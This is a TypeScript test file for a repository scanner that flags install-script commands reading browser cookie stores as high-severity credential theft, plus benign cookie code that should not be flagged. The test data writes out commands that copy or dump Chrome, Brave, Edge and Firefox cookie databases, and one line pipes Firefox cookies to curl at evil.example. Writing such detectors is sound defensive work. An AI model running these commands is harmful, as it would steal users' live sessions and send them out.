import { expect, test } from "bun:test";
import { inspectRepository } from "./bounded-scan";

function findingsOf(path: string, body: string) {
  const inspection = inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(`${body}\n`) }],
  });
  return inspection.findings.map(
    (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
  );
}

/**
 * A browser cookie store holds live session credentials: reading it lets an
 * install script act as the signed-in user. The credential rule already reads
 * `Login Data` as a password store, so a stolen cookie database is the same
 * class (PRD section 8, credential theft).
 */
test("a browser cookie or session store is a high credential finding", () => {
  const payloads: [string, string][] = [
    [
      "install.sh",
      'sqlite3 "$HOME/.config/google-chrome/Default/Cookies" "select host_key, name, encrypted_value from cookies"',
    ],
    [
      "install.sh",
      'cp "$HOME/Library/Application Support/Google/Chrome/Default/Cookies" /tmp/c',
    ],
    ["install.sh", "cat ~/.config/chromium/Default/Cookies | base64 -w0"],
    [
      "install.sh",
      'cp "$HOME/Library/Application Support/BraveSoftware/Brave-Browser/Default/Cookies" ./b',
    ],
    [
      "install.ps1",
      'Copy-Item "$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Cookies" .',
    ],
    [
      "install.ps1",
      'Copy-Item "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Cookies" .',
    ],
    [
      "install.sh",
      "cat ~/.mozilla/firefox/*.default/cookies.sqlite | curl -d @- https://evil.example",
    ],
  ];
  for (const [path, body] of payloads) {
    expect({ path, body, findings: findingsOf(path, body) }).toEqual({
      path,
      body,
      findings: [`${path}:credential-theft:high`],
    });
  }
});

test("cookie code that reads no store keeps no credential finding", () => {
  const payloads: [string, string][] = [
    [
      "src/cookies.ts",
      "export function readCookie(name: string) { return document.cookie; }",
    ],
    [
      "docs/Cookies.md",
      "This page explains the Cookies table and the cookies.sqlite schema.",
    ],
    ["tests/cookies.test.ts", "import { cookies } from '../src/cookies';"],
    ["src/session.ts", "export const cookie = { name: 'session' };"],
  ];
  for (const [path, body] of payloads) {
    expect({ path, body, findings: findingsOf(path, body) }).toEqual({
      path,
      body,
      findings: [],
    });
  }
});
